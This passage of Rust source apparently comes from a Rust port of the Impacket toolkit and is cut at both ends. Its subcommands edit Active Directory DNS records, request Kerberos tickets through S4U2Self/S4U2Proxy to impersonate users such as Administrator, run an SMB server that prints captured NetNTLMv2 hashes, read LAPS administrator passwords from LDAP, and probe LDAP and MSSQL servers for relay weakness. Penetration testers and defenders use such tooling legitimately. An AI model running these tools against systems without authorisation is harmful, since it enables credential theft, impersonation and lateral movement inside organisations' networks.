                DnsRecordType::Ptr => DnsRpcRecord::new_ptr(&data_str, ttl, 0),
                DnsRecordType::Txt => DnsRpcRecord::new_txt(&[&data_str], ttl, 0),
                DnsRecordType::Srv => {
                    DnsRpcRecord::new_srv(srv_priority, srv_weight, srv_port, &data_str, ttl, 0)
                }
                DnsRecordType::Mx => {
                    DnsRpcRecord {
                        record_type: DnsRecordType::Mx,
                        version: impacket_ldap::DNS_RPC_RECORD_VERSION,
                        rank: impacket_ldap::RANK_ZONE,
                        flags: 0,
                        serial: 0,
                        ttl_seconds: ttl,
                        reserved: 0,
                        timestamp: 0,
                        data: DnsRecordData::Mx {
                            preference: mx_pref,
                            exchange: data_str.clone(),
                        },
                    }
                }
                other => {
                    eprintln!("[-] Adding record type {:?} not supported directly", other);
                    std::process::exit(1);
                }
            };

            if action == "add" {
                println!("[*] Adding DNS record '{}' ({:?}: {}) to zone {}...", record_name, rtype, data_str, zone_display);
                match add_dns_node(&mut client, &zone_dn, &record_name, &record) {
                    Ok(()) => println!("[+] Successfully added DNS record '{}'.", record_name),
                    Err(e) => eprintln!("[-] Failed to add DNS record: {}", e),
                }
            } else {
                println!("[*] Modifying DNS record '{}' ({:?}: {}) in zone {}...", record_name, rtype, data_str, zone_display);
                match modify_dns_node(&mut client, &zone_dn, &record_name, &record) {
                    Ok(()) => println!("[+] Successfully modified DNS record '{}'.", record_name),
                    Err(e) => eprintln!("[-] Failed to modify DNS record: {}", e),
                }
            }
        }
        "tombstone" => {
            if record_name == "*" {
                eprintln!("[-] Action tombstone requires a specific record name with -record <NAME>");
                std::process::exit(1);
            }
            println!("[*] Tombstoning DNS node '{}' in zone {}...", record_name, zone_display);
            match tombstone_dns_node(&mut client, &zone_dn, &record_name, 0) {
                Ok(()) => println!("[+] Successfully tombstoned DNS node '{}'.", record_name),
                Err(e) => eprintln!("[-] Failed to tombstone DNS node: {}", e),
            }
        }
        "delete" => {
            if record_name == "*" {
                eprintln!("[-] Action delete requires a specific record name with -record <NAME>");
                std::process::exit(1);
            }
            println!("[*] Deleting DNS node '{}' from zone {}...", record_name, zone_display);
            match delete_dns_node(&mut client, &zone_dn, &record_name) {
                Ok(()) => println!("[+] Successfully deleted DNS node '{}'.", record_name),
                Err(e) => eprintln!("[-] Failed to delete DNS node: {}", e),
            }
        }
        other => {
            eprintln!("[-] Unknown action '{}': choose query, add, modify, tombstone, or delete", other);
        }
    }

    client.unbind().ok();
}

fn cmd_ldapclient(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: impacket-rs ldapclient <DOMAIN/USER[:PASSWORD]@TARGET> [options]");
        println!("       impacket-rs ldap_shell <DOMAIN/USER[:PASSWORD]@TARGET> [options]");
        println!();
        println!("Options:");
        println!("  -base <DN>           Base DN (default: discovered via RootDSE or domain)");
        println!("  -port <PORT>         LDAP port (default 389)");
        println!("  -hashes LM:NT        NTLM hash authentication (:NT)");
        println!("  -c <COMMAND>         Execute single command non-interactively and exit");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };

    let mut port: u16 = 389;
    let mut custom_base = None;
    let mut single_cmd: Option<String> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-base" if i + 1 < args.len() => {
                custom_base = Some(args[i + 1].clone());
                i += 2;
            }
            "-port" if i + 1 < args.len() => {
                if let Ok(p) = args[i + 1].parse() {
                    port = p;
                }
                i += 2;
            }
            "-c" if i + 1 < args.len() => {
                single_cmd = Some(args[i + 1].clone());
                i += 2;
            }
            _ => i += 1,
        }
    }

    let host = spec.effective_target_ip();
    let addr = format!("{}:{}", host, port);

    println!("[*] Connecting to LDAP server at {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] Failed to connect to LDAP server at {}: {}", addr, e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };

    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Performing simple LDAP bind as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] Bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful");
    } else {
        println!("[*] Performing anonymous LDAP bind...");
        if let Err(e) = client.bind_simple("", "") {
            eprintln!("[-] Anonymous bind failed: {}", e);
            std::process::exit(1);
        }
    }

    let base_dn = custom_base.unwrap_or_else(|| domain_to_base_dn(&spec.domain));
    let mut session = impacket_ldap::LdapShellSession::new(client, base_dn, spec.domain.clone(), spec.username.clone());
    if let Err(e) = session.init() {
        eprintln!("[-] Warning initializing RootDSE: {}", e);
    }

    if let Some(cmd) = single_cmd {
        match session.dispatch_command(&cmd) {
            Ok(output) => {
                print!("{}", output);
            }
            Err(e) => {
                eprintln!("[-] Command execution failed: {}", e);
                std::process::exit(1);
            }
        }
        return;
    }

    println!("[*] Type 'help' for available commands, 'exit' to quit.");
    let stdin = std::io::stdin();
    let mut stdout = std::io::stdout();
    let _ = session.run_repl(&mut stdin.lock(), &mut stdout);
}

fn cmd_get_st(args: &[String]) {
    use impacket_krb5::get_tgs_live;
    use impacket_krb5::tgs::{decrypt_u2u_ticket_enc_part, extract_session_key_from_as_rep, Krb5TgsReq};
    use impacket_krb5::{get_tgt_live, KerberosEType, KdcAsResponse, CCache};
    use std::time::SystemTime;

    print!("{}", version::BANNER);
    if args.is_empty() {
        eprintln!("Usage: impacket-rs getST <TARGET> -spn <SPN> [-impersonate <USER>] [-u2u <SERVER_TGT>] [-hashes LM:NT] [-save]");
        eprintln!("  Requests a Kerberos Service Ticket via TGS-REQ, S4U (S4U2Self + S4U2Proxy), or U2U (ENC-TICKET-IN-SKEY)");
        eprintln!("  Examples:");
        eprintln!("    impacket-rs getST corp.contoso.com/websvc:Pass@kdc -spn cifs/target.corp.contoso.com");
        eprintln!("    impacket-rs getST corp.contoso.com/websvc:Pass@kdc -spn cifs/target.corp.contoso.com -impersonate Administrator -save");
        eprintln!("    impacket-rs getST corp.contoso.com/client:Pass@kdc -spn server$ -u2u server.ccache -save");
        std::process::exit(1);
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Invalid target '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };

    let mut spn: Option<String> = None;
    let mut impersonate_user: Option<String> = None;
    let mut u2u_tgt_file: Option<String> = None;
    let mut save_ccache = false;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-spn" if i + 1 < args.len() => {
                spn = Some(args[i + 1].clone());
                i += 2;
            }
            "-impersonate" if i + 1 < args.len() => {
                impersonate_user = Some(args[i + 1].clone());
                i += 2;
            }
            "-u2u" if i + 1 < args.len() => {
                u2u_tgt_file = Some(args[i + 1].clone());
                i += 2;
            }
            "-save" => {
                save_ccache = true;
                i += 1;
            }
            _ => i += 1,
        }
    }

    let target_spn = match spn {
        Some(s) => s,
        None => {
            eprintln!("[-] Missing mandatory parameter: -spn <SPN>");
            std::process::exit(1);
        }
    };

    let kdc_host = spec.effective_target_ip();
    println!("[*] Requesting TGT from KDC at {}:88 for '{}'...", kdc_host, spec.username);

    let nt_hash: [u8; 16] = if let Some(h) = &spec.hashes {
        h.nt
    } else if let Some(p) = &spec.password {
        compute_ntlm_hashes(p.expose_secret()).nt
    } else {
        eprintln!("[-] getST needs a password or -hashes :NT");
        std::process::exit(1);
    };

    let (tgt_ticket, enc_part_cipher) = match get_tgt_live(
        spec.effective_target_ip(),
        88,
        &spec.domain,
        &spec.username,
        &nt_hash,
        DEFAULT_TIMEOUT,
    ) {
        Ok(KdcAsResponse::AsRep {
            ticket,
            enc_part_cipher,
            ..
        }) => (ticket, enc_part_cipher),
        Ok(KdcAsResponse::Error { error_code, .. }) => {
            eprintln!(
                "[-] KDC returned error during TGT acquisition: 0x{:X} ({})",
                error_code.0,
                error_code.name()
            );
            std::process::exit(1);
        }
        Err(e) => {
            eprintln!("[-] Failed to acquire TGT: {}", e);
            std::process::exit(1);
        }
    };

    println!("[+] Acquired TGT successfully.");
    let (session_etype, session_key) = match extract_session_key_from_as_rep(&enc_part_cipher, &nt_hash) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("[-] Failed to decrypt TGS session key: {}", e);
            std::process::exit(1);
        }
    };

    let now_unix = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(1_700_000_000);

    let (final_rep, final_client) = if let Some(ref imp_user) = impersonate_user {
        println!("[*] Executing S4U2Self: requesting ticket for '{}' to service '{}'...", imp_user, spec.username);
        let mut s4u_self_req = Krb5TgsReq::new(
            &spec.domain,
            &spec.username,
            &spec.username,
            &tgt_ticket,
            &session_key,
            session_etype,
            &[KerberosEType::Rc4Hmac, KerberosEType::Aes256CtsHmacSha1_96],
        );
        s4u_self_req.s4u2self_user = Some(imp_user.clone());

        let s4u_self_rep = match get_tgs_live(&kdc_host, 88, &s4u_self_req, now_unix, DEFAULT_TIMEOUT) {
            Ok(r) => r,
            Err(e) => {
                eprintln!("[-] S4U2Self failed: {}", e);
                std::process::exit(1);
            }
        };
        println!("[+] S4U2Self ticket received for '{}'.", imp_user);

        println!("[*] Executing S4U2Proxy: requesting ticket for '{}' to target SPN '{}'...", imp_user, target_spn);
        let mut s4u_proxy_req = Krb5TgsReq::new(
            &spec.domain,
            &spec.username,
            &target_spn,
            &tgt_ticket,
            &session_key,
            session_etype,
            &[KerberosEType::Rc4Hmac, KerberosEType::Aes256CtsHmacSha1_96],
        );
        s4u_proxy_req.additional_tickets = vec![s4u_self_rep.ticket_raw.clone()];

        let s4u_proxy_rep = match get_tgs_live(&kdc_host, 88, &s4u_proxy_req, now_unix, DEFAULT_TIMEOUT) {
            Ok(r) => r,
            Err(e) => {
                eprintln!("[-] S4U2Proxy failed: {}", e);
                std::process::exit(1);
            }
        };
        println!("[+] S4U2Proxy ticket successfully acquired for target SPN '{}'!", target_spn);
        (s4u_proxy_rep, imp_user.clone())
    } else if let Some(ref u2u_path) = u2u_tgt_file {
        println!("[*] Reading target server TGT from '{}' for User-to-User (U2U) authentication...", u2u_path);
        let raw_bytes = match std::fs::read(u2u_path) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] Failed to read server TGT file '{}': {}", u2u_path, e);
                std::process::exit(1);
            }
        };
        let ccache = if raw_bytes.first() == Some(&0x76) {
            match CCache::from_kirbi(&raw_bytes) {
                Ok(c) => c,
                Err(e) => {
                    eprintln!("[-] Failed to parse .kirbi file: {}", e);
                    std::process::exit(1);
                }
            }
        } else {
            match CCache::parse(&raw_bytes) {
                Ok(c) => c,
                Err(e) => {
                    eprintln!("[-] Failed to parse .ccache file: {}", e);
                    std::process::exit(1);
                }
            }
        };

        let cred = match ccache.credentials.first() {
            Some(c) => c,
            None => {
                eprintln!("[-] No credentials found in server TGT container");
                std::process::exit(1);
            }
        };

        let server_tgt_bytes = cred.ticket.clone();
        let server_session_key = cred.key.keyvalue.clone();
        let server_session_etype = cred.key.keytype as i32;

        println!("[*] Requesting U2U Service Ticket (ENC-TICKET-IN-SKEY) for target '{}'...", target_spn);
        let mut tgs_req = Krb5TgsReq::new(
            &spec.domain,
            &spec.username,
            &target_spn,
            &tgt_ticket,
            &session_key,
            session_etype,
            &[KerberosEType::Rc4Hmac, KerberosEType::Aes256CtsHmacSha1_96],
        );
        tgs_req.with_u2u(server_tgt_bytes);

        let rep = match get_tgs_live(&kdc_host, 88, &tgs_req, now_unix, DEFAULT_TIMEOUT) {
            Ok(r) => r,
            Err(e) => {
                eprintln!("[-] U2U Service Ticket request failed: {}", e);
                std::process::exit(1);
            }
        };
        println!("[+] U2U Service Ticket acquired successfully!");

        if let Ok(plain_enc) = decrypt_u2u_ticket_enc_part(&rep.ticket_raw, &server_session_key, server_session_etype) {
            println!("[+] Successfully decrypted U2U ticket enc-part using server TGT session key ({} bytes).", plain_enc.len());
        }

        (rep, spec.username.clone())
    } else {
        println!("[*] Requesting standard Service Ticket for SPN '{}'...", target_spn);
        let tgs_req = Krb5TgsReq::new(
            &spec.domain,
            &spec.username,
            &target_spn,
            &tgt_ticket,
            &session_key,
            session_etype,
            &[KerberosEType::Rc4Hmac, KerberosEType::Aes256CtsHmacSha1_96],
        );
        let rep = match get_tgs_live(&kdc_host, 88, &tgs_req, now_unix, DEFAULT_TIMEOUT) {
            Ok(r) => r,
            Err(e) => {
                eprintln!("[-] Service Ticket request failed: {}", e);
                std::process::exit(1);
            }
        };
        println!("[+] Service Ticket acquired successfully!");
        (rep, spec.username.clone())
    };

    println!("  Service Realm  : {}", final_rep.ticket_realm);
    println!("  Service SName  : {}", final_rep.ticket_sname.join("/"));
    println!("  Ticket EType   : {}", final_rep.ticket_enc_etype);
    println!("  Cipher Length  : {} bytes", final_rep.ticket_enc_cipher.len());

    if save_ccache {
        let filename = format!("{}.ccache", final_client);
        let ccache = final_rep.to_ccache(&spec.domain, &final_client, &session_key, session_etype as u16);
        if let Err(e) = std::fs::write(&filename, &ccache.to_bytes()) {
            eprintln!("[-] Failed to save ccache: {}", e);
        } else {
            println!("[+] Saved service ticket to '{}'", filename);
        }
    }
}

fn cmd_smbserver(args: &[String]) {
    print!("{}", version::BANNER);
    if args.len() < 2 {
        println!("Usage: smbserver <SHARE_NAME> <SHARE_PATH> [options]");
        println!();
        println!("Arguments:");
        println!("  SHARE_NAME                 Name of the share exposed to clients (e.g. SHARE, TMP, ROOTS)");
        println!("  SHARE_PATH                 Local directory path exposed by the share");
        println!();
        println!("Options:");
        println!("  -comment <COMMENT>         Share description comment");
        println!("  -port <PORT>               Port to listen on (default: 445)");
        println!("  -interface <IP>            IP address to bind on (default: 0.0.0.0)");
        println!("  -username <USER>           Require specific username for authentication");
        println!("  -password <PASS>           Require specific password for authentication");
        println!("  -hashes [LM:]NT            Require specific NT hash for authentication");
        println!("  -readonly                  Make the share read-only (reject write/delete operations)");
        return;
    }

    let share_name = &args[0];
    let share_path = &args[1];

    let mut comment = "Impacket-RS Share".to_string();
    let mut port = 445u16;
    let mut interface = "0.0.0.0".to_string();
    let mut username: Option<String> = None;
    let mut password: Option<String> = None;
    let mut nt_hash: Option<[u8; 16]> = None;
    let mut read_only = false;

    let mut i = 2;
    while i < args.len() {
        match args[i].as_str() {
            "-comment" if i + 1 < args.len() => {
                comment = args[i + 1].clone();
                i += 2;
            }
            "-port" if i + 1 < args.len() => {
                if let Ok(p) = args[i + 1].parse::<u16>() {
                    port = p;
                }
                i += 2;
            }
            "-interface" | "-ip" if i + 1 < args.len() => {
                interface = args[i + 1].clone();
                i += 2;
            }
            "-username" | "-user" if i + 1 < args.len() => {
                username = Some(args[i + 1].clone());
                i += 2;
            }
            "-password" | "-pass" if i + 1 < args.len() => {
                password = Some(args[i + 1].clone());
                i += 2;
            }
            "-hashes" if i + 1 < args.len() => {
                let h_str = &args[i + 1];
                let nt_hex = if let Some(idx) = h_str.find(':') {
                    &h_str[idx + 1..]
                } else {
                    h_str.as_str()
                };
                if let Ok(bytes) = impacket_core::decode_hex(nt_hex) {
                    if bytes.len() == 16 {
                        let mut arr = [0u8; 16];
                        arr.copy_from_slice(&bytes);
                        nt_hash = Some(arr);
                    }
                }
                i += 2;
            }
            "-readonly" | "-read-only" => {
                read_only = true;
                i += 1;
            }
            _ => {
                i += 1;
            }
        }
    }

    if let (Some(ref pass), None) = (&password, nt_hash) {
        nt_hash = Some(compute_ntlm_hashes(pass).nt);
    }

    let p = std::path::Path::new(share_path);
    if !p.exists() {
        eprintln!("[-] Local path '{}' does not exist", share_path);
        return;
    }

    let mut config = SmbServerConfig::default();
    config.listen_addr = interface;
    config.listen_port = port;
    config.username = username.clone();
    config.password = password.clone();
    config.nt_hash = nt_hash;
    config.allow_anonymous = username.is_none() && nt_hash.is_none();

    config.shares = vec![
        SmbShare::new_ipc(),
        SmbShare::new_disk(share_name, p, &comment, read_only),
    ];

    println!("[*] Initializing Impacket-RS pure-Rust SMB2 server...");
    println!("  Share name : {}", share_name);
    println!("  Local path : {}", p.display());
    println!("  Read-only  : {}", read_only);
    if let Some(ref u) = username {
        println!("  Auth user  : {}", u);
    }
    println!("  Listen     : {}:{}", config.listen_addr, config.listen_port);

    let server = SmbServer::new(config);
    let cb = std::sync::Arc::new(|hash: &str| {
        println!("\n[+] Captured NetNTLMv2 Hash:");
        println!("    {}", hash);
    });

    if let Err(e) = server.run_with_callback(Some(cb)) {
        eprintln!("[-] SMB server error: {}", e);
    }
}

// ----------------------------------------------------------------------------
// Group 1 Tool Implementations
// ----------------------------------------------------------------------------

fn cmd_get_laps_password(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs GetLAPSPassword <TARGET> [-computer <NAME>] [-port <PORT>]");
        std::process::exit(1);
    }
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };
    let mut port: u16 = 389;
    let mut target_computer: Option<String> = None;
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-computer" if i + 1 < args.len() => {
                target_computer = Some(args[i + 1].clone());
                i += 2;
            }
            "-port" if i + 1 < args.len() => {
                if let Ok(p) = args[i + 1].parse() {
                    port = p;
                }
                i += 2;
            }
            _ => i += 1,
        }
    }
    let host = spec.effective_target_ip();
    let addr = format!("{}:{}", host, port);
    println!("[*] Connecting to LDAP server at {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] Failed to connect to LDAP server at {}: {}", addr, e);
            std::process::exit(1);
        }
    };
    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };
    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Performing LDAP bind as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] LDAP bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful");
    } else {
        println!("[*] Performing anonymous LDAP bind...");
        if let Err(e) = client.bind_simple("", "") {
            eprintln!("[-] Anonymous bind failed: {}", e);
            std::process::exit(1);
        }
    }

    let base_dn = domain_to_base_dn(&spec.domain);
    let filter = if let Some(ref c) = target_computer {
        let comp_filter = if c.ends_with('$') { c.clone() } else { format!("{}$", c) };
        filter_and(&[
            filter_equality("objectCategory", "computer"),
            filter_equality("sAMAccountName", &comp_filter),
        ])
    } else {
        filter_and(&[
            filter_equality("objectCategory", "computer"),
            filter_or(&[
                filter_present("ms-Mcs-AdmPwd"),
                filter_present("msLAPS-Password"),
            ]),
        ])
    };

    let attributes = [
        "sAMAccountName",
        "dNSHostName",
        "ms-Mcs-AdmPwd",
        "ms-Mcs-AdmPwdExpirationTime",
        "msLAPS-Password",
        "msLAPS-PasswordExpirationTime",
    ];
    println!("[*] Querying LAPS and Windows LAPS attributes under '{}'...", base_dn);
    let entries = match client.search(&base_dn, SearchScope::WholeSubtree, &filter, &attributes) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("[-] LDAP search failed: {}", e);
            std::process::exit(1);
        }
    };

    if entries.is_empty() {
        println!("[-] No LAPS passwords found matching query.");
        return;
    }
    println!("\n{:<25} {:<16} {:<30} {:<24}", "Computer Name", "LAPS Type", "Password", "Expiration");
    println!("{:-<25} {:-<16} {:-<30} {:-<24}", "", "", "", "");
    for entry in entries {
        let sam = entry.get_string("sAMAccountName").unwrap_or_else(|| "<unknown>".into());
        let dns = entry.get_string("dNSHostName").unwrap_or(sam);

        if let Some(pwd) = entry.get_string("ms-Mcs-AdmPwd") {
            let exp_raw = entry.get_string("ms-Mcs-AdmPwdExpirationTime").unwrap_or_default();
            let exp_str = format_filetime_str(&exp_raw);
            println!("{:<25} {:<16} {:<30} {:<24}", dns, "Legacy LAPS", pwd, exp_str);
        }
        if let Some(laps_pwd) = entry.get_string("msLAPS-Password") {
            let exp_raw = entry.get_string("msLAPS-PasswordExpirationTime").unwrap_or_default();
            let exp_str = format_filetime_str(&exp_raw);
            let disp_pwd = if let Some(p_idx) = laps_pwd.find(r#""p":""#) {
                let rest = &laps_pwd[p_idx + 5..];
                if let Some(end_idx) = rest.find('"') {
                    rest[..end_idx].to_string()
                } else {
                    laps_pwd
                }
            } else {
                laps_pwd
            };
            println!("{:<25} {:<16} {:<30} {:<24}", dns, "Windows LAPS", disp_pwd, exp_str);
        }
    }
}

fn cmd_check_ldap_status(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs CheckLDAPStatus <TARGET> [-port <PORT>]");
        std::process::exit(1);
    }
    let target = &args[0];
    let mut port: u16 = 389;
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-port" if i + 1 < args.len() => {
                if let Ok(p) = args[i + 1].parse() {
                    port = p;
                }
                i += 2;
            }
            _ => i += 1,
        }
    }
    let addr = format!("{}:{}", target, port);
    println!("[*] Connecting to LDAP server at {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] TCP connect error: {}", e);
            std::process::exit(1);
        }
    };
    println!("[*] Querying RootDSE...");
    let attrs = [
        "supportedLDAPVersion",
        "supportedSASLMechanisms",
        "supportedCapabilities",
        "ldapServiceName",
        "domainFunctionality",
        "defaultNamingContext",
        "dnsHostName",
        "serverName",
    ];
    let res = client.search("", SearchScope::BaseObject, b"(objectClass=*)", &attrs);
    let entries = match res {
        Ok(e) => e,
        Err(e) => {
            eprintln!("[-] RootDSE search failed: {}", e);
            std::process::exit(1);
        }
    };
    if let Some(dse) = entries.first() {
        println!("\n=== LDAP Server RootDSE Status ===");
        if let Some(dns) = dse.get_string("dnsHostName") {
            println!("  DNS Host Name            : {}", dns);
        }
        if let Some(srv) = dse.get_string("serverName") {
            println!("  Server Name              : {}", srv);
        }
        if let Some(dnc) = dse.get_string("defaultNamingContext") {
            println!("  Default Naming Context   : {}", dnc);
        }
        if let Some(svc) = dse.get_string("ldapServiceName") {
            println!("  Service Name             : {}", svc);
        }
        if let Some(df) = dse.get_string("domainFunctionality") {
            println!("  Domain Functionality     : Level {}", df);
        }
        let sasl = dse.get_all_strings("supportedSASLMechanisms");
        if !sasl.is_empty() {
            println!("  Supported SASL Mech      : {}", sasl.join(", "));
        }
        let ldap_vers = dse.get_all_strings("supportedLDAPVersion");
        if !ldap_vers.is_empty() {
            println!("  Supported LDAP Versions  : {}", ldap_vers.join(", "));
        }
    }
    println!("\n[*] Probing LDAP Signing Requirements...");
    let anon_bind = client.bind_simple("", "");
    match anon_bind {
        Ok(_) => {
            println!("  Anonymous Bind           : ACCEPTED");
            println!("  LDAP Signing Enforcement : NOT ENFORCED (Vulnerable to NTLM Relay)");
        }
        Err(ref e) => {
            let err_msg = e.to_string();
            if err_msg.contains("strongAuthRequired") || err_msg.contains("8") {
                println!("  Anonymous Bind           : REJECTED (strongAuthRequired)");
                println!("  LDAP Signing Enforcement : REQUIRED / ENFORCED");
            } else {
                println!("  Anonymous Bind           : REJECTED ({})", err_msg);
                println!("  LDAP Signing Enforcement : UNCERTAIN / AUTH REQUIRED");
            }
        }
    }
}

fn cmd_get_arch(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs getArch <TARGET> [port]");
        std::process::exit(1);
    }
    let target = &args[0];
    let port: u16 = if args.len() > 1 {
        args[1].parse().unwrap_or(135)
    } else {
        135
    };
    println!("[*] Probing remote OS architecture via DCE/RPC NDR64 syntax at {}:{}...", target, port);
    match get_arch_live(target, port, DEFAULT_TIMEOUT) {
        Ok(arch) => {
            println!("[+] Target: {}:{}", target, port);
            println!("[+] Remote Architecture: {}", arch);
        }
        Err(e) => {
            eprintln!("[-] getArch failed: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_machine_role(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs machine_role <TARGET> [-hashes LM:NT]");
        std::process::exit(1);
    }
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };
    println!("[*] Connecting to MS-WKST over \\PIPE\\wkssvc at {}...", spec.effective_target_ip());
    let transport = match open_pipe_transport(&spec, "wkssvc", IFACE_WKST) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Failed connecting to \\PIPE\\wkssvc: {}", e);
            std::process::exit(1);
        }
    };
    let mut client = WkstClient::new(transport);
    let (join_name, join_status) = match client.get_join_information("") {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[-] NetrGetJoinInformation failed: {}", e);
            std::process::exit(1);
        }
    };
    let info = client.get_info("").ok();
    println!("\n=== Remote Machine Role & Domain Status ===");
    println!("  Target Host              : {}", spec.effective_target_ip());
    if let Some(ref inf) = info {
        println!("  Computer Name            : {}", inf.computer_name);
        println!("  LAN Group / Domain       : {}", inf.langroup);
        println!("  OS Version               : {}.{} (Platform ID {})", inf.ver_major, inf.ver_minor, inf.platform_id);
    }
    println!("  Join Status              : {}", join_status.name());
    println!("  Domain / Workgroup Name  : {}", join_name);
}

fn cmd_mssqlinstance(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs mssqlinstance <TARGET> [-port 1434]");
        std::process::exit(1);
    }
    let target = &args[0];
    let mut port: u16 = 1434;
    let mut i = 1;
    while i < args.len() {
        if args[i] == "-port" && i + 1 < args.len() {
            if let Ok(p) = args[i + 1].parse() {
                port = p;
            }
            i += 2;
        } else {
            i += 1;
        }
    }
    println!("[*] Sending [MC-SQLR] discovery request to UDP/{}:{}...", target, port);
    let instances = match impacket_mssql::query_sql_instances_udp(target, port, DEFAULT_TIMEOUT) {
        Ok(inst) => inst,
        Err(e) => {
            eprintln!("[-] SQL Browser query failed: {}", e);
            std::process::exit(1);
        }
    };
    if instances.is_empty() {
        println!("[-] No SQL Server instances reported by SQL Browser at {}.", target);
        return;
    }
    println!("\nDiscovered {} SQL Server instance(s) at {}:", instances.len(), target);
    for (idx, inst) in instances.iter().enumerate() {
        println!("\nInstance #{}", idx + 1);
        println!("  Server Name    : {}", inst.server_name);
        println!("  Instance Name  : {}", inst.instance_name);
        println!("  Clustered      : {}", if inst.is_clustered { "Yes" } else { "No" });
        println!("  Version        : {}", inst.version);
        if let Some(tcp) = inst.tcp_port {
            println!("  TCP Port       : {}", tcp);
        }
        if let Some(ref np) = inst.named_pipe {
            println!("  Named Pipe     : {}", np);
        }
    }
}

fn cmd_check_mssql_status(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs checkMSSQLStatus <TARGET> [-port 1433]");
        std::process::exit(1);
    }
    use std::net::{SocketAddr, TcpStream, ToSocketAddrs};
    let target = &args[0];
    let mut port: u16 = 1433;
    let mut i = 1;
    while i < args.len() {
        if args[i] == "-port" && i + 1 < args.len() {
            if let Ok(p) = args[i + 1].parse() {
                port = p;
            }
            i += 2;
        } else {
            i += 1;
        }
    }
    let addr_str = format!("{}:{}", target, port);
    println!("[*] Connecting to MSSQL TDS server at {}...", addr_str);
    let sock_addr: SocketAddr = match addr_str.to_socket_addrs().ok().and_then(|mut iter| iter.next()) {
        Some(a) => a,
        None => {
            eprintln!("[-] Failed to resolve address: {}", addr_str);
            std::process::exit(1);
        }
    };
    let mut stream = match TcpStream::connect_timeout(&sock_addr, DEFAULT_TIMEOUT) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] TCP connection failed: {}", e);
            std::process::exit(1);
        }
    };
    let _ = stream.set_read_timeout(Some(DEFAULT_TIMEOUT));
    let _ = stream.set_write_timeout(Some(DEFAULT_TIMEOUT));

    let prelogin_payload = impacket_mssql::build_prelogin_request(impacket_mssql::encrypt_mode::ENCRYPT_NOT_SUP);
    if let Err(e) = impacket_mssql::write_tds_message(
        &mut stream,
        impacket_mssql::packet_type::PRE_LOGIN,
        &prelogin_payload,
        impacket_mssql::DEFAULT_PACKET_SIZE,
    ) {
        eprintln!("[-] Failed sending PRELOGIN message: {}", e);
        std::process::exit(1);
    }
    let (hdr, resp_body) = match impacket_mssql::read_tds_packet(&mut stream) {
        Ok(res) => res,
        Err(e) => {
            eprintln!("[-] Failed reading PRELOGIN response: {}", e);
            std::process::exit(1);
        }
    };
    if hdr.ptype != impacket_mssql::packet_type::TABULAR_RESULT {
        eprintln!("[-] Unexpected TDS packet type: 0x{:02X}", hdr.ptype);
    }
    let prelogin_resp = match impacket_mssql::parse_prelogin_response(&resp_body) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("[-] Failed parsing PRELOGIN response: {}", e);
            std::process::exit(1);
        }
    };
    let v = prelogin_resp.version;
    let enc_desc = match prelogin_resp.encryption {
        impacket_mssql::encrypt_mode::ENCRYPT_OFF => "ENCRYPT_OFF (0x00) - Unencrypted / Cleartext allowed (Vulnerable to relay/interception)",
        impacket_mssql::encrypt_mode::ENCRYPT_ON => "ENCRYPT_ON (0x01) - Encryption enabled",
